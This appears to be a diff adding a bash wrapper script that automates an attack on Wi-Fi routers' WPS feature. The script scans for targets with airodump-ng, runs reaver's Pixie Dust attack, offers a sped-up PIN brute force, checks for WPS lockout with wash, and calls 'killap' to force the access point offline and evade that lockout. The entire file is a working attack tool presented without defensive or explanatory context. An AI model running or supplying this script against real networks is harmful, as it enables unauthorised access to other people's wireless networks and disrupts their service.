@@ -1,0 +1,38 @@
+#!/bin/bash
+if iwconfig | grep -q "wlan0mon"
+then
+	airodump-ng wlan0mon --wps
+	read -p "Enter target's BSSID:" BSSID
+	read -p "Enter target's channel:" CH
+	echo "Starting reaver..."
+	reaver -i wlan0mon -c $CH -b $BSSID -K 1
+	read -p "Continue with bruteforce? [Y/n]" MODE
+	if [ "$MODE" == "Y" ]
+	then
+		read -p "Speed up? [Y/n]" MODE
+		if [ "$MODE" == "Y" ]
+		then
+			reaver -i wlan0mon -c $CH -b $BSSID -f -E -L -d 0 -S
+		else
+			reaver -i wlan0mon -c $CH -b $BSSID -f -E -L
+		fi
+	fi
+	echo "Checking if WPS is locked..."
+	xterm -e wash -i wlan0mon -C
+	read -p "Kill AP (WPSLock evasion)? [Y/n]" MODE
+	if [ "$MODE" == "Y" ]
+	then
+		killap $BSSID
+	fi
+	read -p "Restart? [Y/n]" MODE
+	if [ "$MODE" == "Y" ]
+	then
+		wpsh
+	else
+		echo "Shutting down..."
+		exit 0
+	fi
+else
+	mmode silent
+	wpsh
+fi
